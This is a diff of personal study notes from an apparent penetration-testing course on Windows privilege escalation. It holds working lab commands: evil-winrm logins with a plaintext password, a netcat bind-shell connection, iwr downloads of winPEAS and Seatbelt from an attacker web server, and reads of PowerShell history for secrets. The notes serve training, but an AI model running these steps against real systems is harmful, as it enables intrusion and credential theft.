@@ -1138,8 +1138,19 @@ Install Wsgidav (Web Distributed Authoring and Versioning): allow clients to upl
   - Using the commands from the transcript file to obtain a PowerShell session as daveadmin. Start a PowerShell remoting session via WinRM on CLIENTWK220 as the user daveadmi (No output dir)
   - Use evil-winrm to connect to CLIENTWK220 as daveadmin instead  
     `evil-winrm -i 192.168.50.220 -u daveadmin -p "qwertqwertqwert123\!\!"`
-  - 
-- Automated Enumeration  
+- Automated Enumeration
+  - Copy WinPEAS to our home directory and start Python3 web server
+    `cp /usr/share/peass/winpeas/winPEASx64.exe .`  `python3 -m http.server 80`
+  - Connect to the bind shell and transfer the WinPEAS binary to CLIENTWK220
+    `nc 192.168.50.220 4444`  `powershell`
+    `iwr -uri http://<KALI>/winPEASx64.exe -Outfile winPEAS.exe`  
+  -  Run winPEAS `.\winPEAS.exe`  
+  -  Review output: system info (Windows), NTLM settings, transcripts history, Users, possible password
+- Service Binary Hijacking
+- DLL hijacking
+- Unquoted Service Paths
+- Scheduled Tasks
+- Using Exploits   
 ### 18. Linux privilege escalation
 ### 19. Port redirection and SSH tunneling
 ### 20. Tunneling through deep packet inspectation
@@ -1867,7 +1878,7 @@ Install Wsgidav (Web Distributed Authoring and Versioning): allow clients to upl
     `Get-LocalGroupMember "Administrators"`
   - List the process and file path  
     `Get-Process`  `(Get-Process -Id 2552).MainModule.FileName`
-- Hidden in Plain view
+- 17.1.3 Hidden in Plain view
   - Find the flag on the desktop of backupadmin
     ```
     nc 192.168.145.220 4444
@@ -1885,7 +1896,7 @@ Install Wsgidav (Web Distributed Authoring and Versioning): allow clients to upl
 
     Decode it [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('ewANAAoAIAAgACIAYgBvAG8AbABlAGEAbgAiADoAIAB0AHIAdQBlACwADQAKACAAIAAiAGEAZABtAGkAbgAiADoAIABmAGEAbABzAGUALAANAAoAIAAgACIAdQBzAGUAcgAiADoAI    AB7AA0ACgAgACAAIAAgACIAbgBhAG0AZQAiADoAIAAiAHIAaQBjAGgAbQBvAG4AZAAiACwADQAKACAAIAAgACAAIgBwAGEAcwBzACIAOgAgACIARwBvAHQAaABpAGMATABpAGYAZQBTAHQAeQBsAGUAMQAzADMANwAhACIADQAKACAAIAB9AA0ACgB9AA=='))
     ```
-- Information Goldmine PowerShell
+- 17.1.4 Information Goldmine PowerShell
   - Q1 obtain an interactive shell as daveadmin and find the flag  
     `evil-winrm -i 192.168.145.220 -u daveadmin -p "qwertqwertqwert123\!\!"`  
   - Q2 connect daveadmin via RDP. Use the Event Viewer to search for events recorded by Script Block Logging  
@@ -1896,6 +1907,27 @@ Install Wsgidav (Web Distributed Authoring and Versioning): allow clients to upl
     Get-History
     (Get-PSReadlineOption).HistorySavePath
     type C:\Users\dave\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+    ```
+- 17.1.5 Automated Enumeration
+  - WinPEAS enumeration
+    `cp /usr/share/peass/winpeas/winPEASx64.exe .`
+    `python3 -m http.server 80`
+
+    ```
+    nc 192.168.145.220 4444
+    powershell
+    iwr -uri http://192.168.45.221/winPEASx64.exe -Outfile winPEAS.exe
+    .\winpeas.exe 
+    ```
+  - Seatbelt enumeration
+    Download https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Seatbelt.exe
+    `python3 -m http.server 80`
+
+    ```
+    nc 192.168.145.220 4444
+    powershell
+    iwr -uri http://192.168.45.221/Seatbelt.exe -Outfile Seatbelt.exe
+    .\Seatbelt.exe -group=all
     ```
 - dd
 
